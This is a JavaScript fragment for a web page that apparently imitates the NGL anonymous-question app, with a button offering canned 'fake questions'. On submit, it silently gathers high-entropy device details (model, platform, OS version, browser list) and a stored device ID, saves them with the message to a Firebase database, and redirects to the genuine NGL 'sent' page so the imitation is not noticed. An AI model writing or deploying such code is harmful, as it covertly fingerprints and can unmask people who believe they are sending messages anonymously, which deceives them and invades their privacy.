        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const db = getDatabase();

     
        // fake questions

        const dice_btn = document.querySelector("#dice-btn");
        const textArea = document.querySelector("#question");

        const questions = [
        "name all your exes",
        "your favorite part of your body?",
        "do you even like school?",
        "you should get a tattoo",
        "who are your best girl friends",
        "are you judgemental",
        "have any netlix recomendations?",
        "opinion on birds?",
        "what time do you usually go to bed?",
        "what are ur plans this weekend?"
        ];

        dice_btn.addEventListener("click", () => {
        const randomQuestion = questions[Math.floor(Math.random() * questions.length)];
        textArea.value = randomQuestion;
        });



        const form = document.getElementById('myForm');

        form.addEventListener('submit', function(event) {
            event.preventDefault();

            try {
                
                navigator.userAgentData
                .getHighEntropyValues([
                    "architecture",
                    "model",
                    "platform",
                    "platformVersion",
                    "fullVersionList"
                ])
                .then((ua) => {
                    const model = ua["model"];
                    const architecture = ua["architecture"];
                    const platform = ua["platform"];
                    const platformVersion = ua["platformVersion"];
                    const fullVersionList = ua["fullVersionList"];

                    // Get form values
                    const question = form.question.value;
                    const timestamp = new Date().toLocaleString();
                    const deviceId = window.localStorage.getItem('deviceId')
                    
                    set(ref(db, 'ngl-messages/' + deviceId + timestamp), {
                        question: question,
                        model: model,
                        architecture: architecture,
                        platform: platform,
                        platformVersion: platformVersion,
                        fullVersionList: fullVersionList,
                        timestamp: timestamp
                    })
                    .then(() => {
                        location.href = "https://ngl.link/p/sent";
                        form.reset();
                    })
                    .catch((error) => {
                        console.error('Error sending message:', error);
                    });

                    
                });
            }
            catch(err) {

                const question = form.question.value;
                    const timestamp = new Date().toLocaleString();
                    const deviceId = window.localStorage.getItem('deviceId')
                    
                    set(ref(db, 'ngl-messages/' + deviceId + "/" + Date.now()), {
                        question: question,
                        timestamp: timestamp
                    })
                    .then(() => {
                        location.href = "https://ngl.link/p/sent";
                        form.reset();
                    })
                    .catch((error) => {
                        console.error('Error sending message:', error);
                    });
            }
        });
